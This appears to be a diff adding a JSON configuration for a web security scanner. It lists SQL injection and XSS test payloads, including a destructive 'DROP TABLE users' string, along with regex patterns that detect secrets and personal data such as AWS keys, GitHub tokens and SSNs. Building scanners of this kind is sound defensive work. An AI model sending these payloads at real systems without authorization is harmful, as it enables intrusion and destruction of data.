@@ -1,0 +1,37 @@
+{
+  "sql_payloads": [
+    "'",
+    "1' OR '1'='1",
+    "' OR 1=1--",
+    "' UNION SELECT NULL--",
+    "'; DROP TABLE users--",
+    "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
+    "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+    "1' UNION SELECT NULL,NULL,NULL,version()--"
+  ],
+  "xss_payloads": [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "<svg onload=alert('XSS')>",
+    "'><script>alert('XSS')</script>",
+    "\"><script>alert('XSS')</script>",
+    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+    "<body onload=alert('XSS')>",
+    "<input type=\"text\" value=\"\" onfocus=\"alert('XSS')\" autofocus>"
+  ],
+  "sensitive_patterns": {
+    "email": "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}",
+    "phone": "\\b\\d{3}[-.]?\\d{3}[-.]?\\d{4}\\b",
+    "ssn": "\\b\\d{3}-\\d{2}-\\d{4}\\b",
+    "api_key": "api[_-]?key[_-]?(['\"`])([a-zA-Z0-9]{32,45})\\1",
+    "credit_card": "\\b(?:\\d{4}[-\\s]?){3}\\d{4}\\b",
+    "aws_access_key": "AKIA[0-9A-Z]{16}",
+    "github_token": "ghp_[a-zA-Z0-9]{36}",
+    "jwt_token": "eyJ[a-zA-Z0-9_-]*\\.[a-zA-Z0-9_-]*\\.[a-zA-Z0-9_-]*"
+  },
+  "scan_settings": {
+    "max_depth": 3,
+    "timeout_seconds": 30
+  }
+}
